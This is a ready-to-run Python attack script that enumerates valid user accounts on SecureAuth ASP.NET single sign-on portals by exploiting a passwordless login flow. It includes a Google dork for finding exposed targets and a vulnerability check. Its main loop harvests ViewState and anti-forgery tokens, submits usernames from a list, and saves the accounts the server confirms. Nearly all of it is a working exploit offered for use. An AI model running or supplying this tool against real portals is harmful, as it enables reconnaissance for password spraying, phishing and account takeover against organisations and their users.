#!/usr/bin/env python3
# Secure Auth Enumeration
# Author: Jessi
# Description: Leverages a user account numeration vulnerability in SecureAuth's ASP.NET form.
# Google Dork: inurl:/SecureAuth6 OR inurl:/SecureAuth18
# Usage: ./SecureAuthEnum.py -t https://auth.domain.com/SecureAuth6 -u users.txt -o valid_users.txt

import requests
import colorama
import time
import re
from art import *
import argparse
import sys
from colorama import Fore, Style


# Define colorama colors.
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
PINK = Fore.MAGENTA
BRIGHT = Style.BRIGHT
DIM = Style.DIM
NORM = Style.NORMAL
RST = Style.RESET_ALL


# Error if no arguments and print example.
if len(sys.argv) <= 1:
    print(f'{RED}{BRIGHT}SecureAuthEnum{RST}: Enumerate valid user accounts from a SecureAuth instance.{RST}\n')
    print(f'{RED}{BRIGHT}Error{DIM}: -t (--target_url) and -u (--users) or -c (--check-only) REQUIRED{RST}')
    print(f'{PINK}{BRIGHT}Example:{RED} SecureAuthEnum.py{NORM}{WHITE} -t https://auth.domain.com/SecureAuth6 -u users.txt{RST}\n')
    print(f'{DIM}-h (--help) to see full usage and arguments.{RST}')
    print('\n')


# Define parser and arguments.
parser = argparse.ArgumentParser(description=f'{RED}{BRIGHT}SecureAuthEnum{RST}: Enumerate valid user accounts from a SecureAuth instance.{RST}')

parser.add_argument('-t', '--target_url', help=f'Target URL {RED}{BRIGHT}REQUIRED{RST}', default=None, required=True)
parser.add_argument('-u', '--users', help=f'Users list {RED}{BRIGHT}REQUIRED{RST}', default=None, required=False)
parser.add_argument('-o', '--output', help=f'Output file name {DIM}OPTIONAL (Defualt: valid_users.txt){RST}', default='valid_users.txt', required=False)
parser.add_argument('-c', '--check_only', help=f'Check if portal is vulnerable', action='store_true', default=False, required=False)

args = parser.parse_args()


# Variables.
url = args.target_url
users_file = args.users
output = args.output
headers = {"User-Agent":"Mozzila/5.0"}
check_only = args.check_only
if not check_only:
    users = open(users_file,"r").readlines()

# Print info.
screen_art = text2art("SecureAuth\nUser Enum", font="small")
print(screen_art)
print(f"{PINK}[*]{RST} Target URL: {BRIGHT}{url}{RST}")

# Check if vulnerable.
print(f"{YELLOW}[!]{RST} Checking if portal is vulnerable...")
time.sleep(2)

vuln_check = requests.get(url, headers=headers)
if not re.search("secureauth", vuln_check.text):
    print(f"{RED}[-]{RST} NOT A SECUREAUTH SSO PORTAL")
    exit(0)
if re.search('UserIDView_trPassword', vuln_check.text):
        print(f"{RED}[-]{RST} NOT VULNERABLE")
        print(f"{YELLOW}[!]{RST} Reason: SSO Portal is not password-less!")
        exit(0)
if not re.search('UserIDView_trPassword', vuln_check.text):
    if check_only:
        print(f"{GREEN}[+]{RST} Appears VULNERABLE!")
    elif not check_only:
        print(f"{GREEN}[+]{RST} Appears VULNERABLE! Continuing...")

if check_only:
    exit(0)


print(f"{YELLOW}[!]{RST} Enumerating users...{RST}\n")
time.sleep(2)

valid_users = [] # Init table.


# Enum users.
for user in users:
    s = requests.Session()
    r_data = s.get(url, headers=headers) # Init session and get data prepped for attack.
    for line in r_data.text.split("\n"):
        if 'id="__VIEWSTATE"' in line:
            viewstate = line.replace('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', "").replace('" />', "").strip() # get __VIEWSTATE
        if '"__RequestVerificationToken"' in line:
            reqverftoken = line.replace('<div id="rvtDiv"><input name="__RequestVerificationToken" type="hidden" value="', "").replace('" /></div>', "").strip() # Get __RequestVerificationToken
        if 'id="hiddenToken"' in line:
            hiddentoken = line.replace('<span id="ContentPlaceHolder1_MFALoginControl1" AntiPhishImagesLocation="~/Antiphish" PasswordExpiredRedirectUrl="PasswordExpired.aspx"><span id="ContentPlaceHolder1_MFALoginControl1_UserIDView"><input type="hidden" name="ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenToken" id="hiddenToken" value="', "").replace('" />', "").strip() # Get __HiddenToken
        if 'id="hiddenServerTime"' in line:
            servertime = line.replace('<input type="hidden" name="ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenServerTime" id="hiddenServerTime" value="', "").replace('" />', "").strip() # Get ServerTime
        if '__VIEWSTATEGENERATOR' in line:
            viewstategen = line.replace('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', "").replace('" />', "").strip() # Get __VIEWSTATEGENERATOR
    payload = {
            "__LASTFOCUS":"",
            "__EVENTTARGET":"",
            "__EVENTARGUMENT":"",
            "__VIEWSTATE":viewstate,
            "__VIEWSTATEGENERATOR":viewstategen,
            "__SCROLLPOSITIONX":0,
            "__SCROLLPOSITIONY":0,
            "__VIEWSTATEENCRYPTED":"",
            "__RequestVerificationToken":reqverftoken,
            "ctl00$ContentPlaceHolder1$hiddenjreversion":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenToken":hiddentoken,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenRet":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenServerTime":servertime,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenLocalTime":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$hiddenSubmit":"",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$ContentPlaceHolder1_MFALoginControl1_UserIDView_txtUserid":user,
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$Kiosk":"Public",
            "ctl00$ContentPlaceHolder1$MFALoginControl1$UserIDView$ctl00$ContentPlaceHolder1_MFALoginControl1_UserIDView_btnSubmit":"Submit"
            } # Set payload.
    r = s.post(url, headers=headers, data=payload) # Send POST req payload.
    for line in r.text.split("\n"):
        if 'Access Denied' in line:
            print(f"{RED}[-]{RST} Invalid Username: " + user.strip()) # Check if invalid user.
        if 'delivery method' in line:
            print(f"{GREEN}[+]{RST} Valid Username: " + user.strip()) # Check if valid user.
            valid_users.append(user)


with open(output, "wt") as results_file:
    results_file.write("".join(valid_users))

userSum = 0
for i in valid_users:
    userSum += 1
print(f"{GREEN}[+]{RST} Enumerated {userSum} user accounts!")
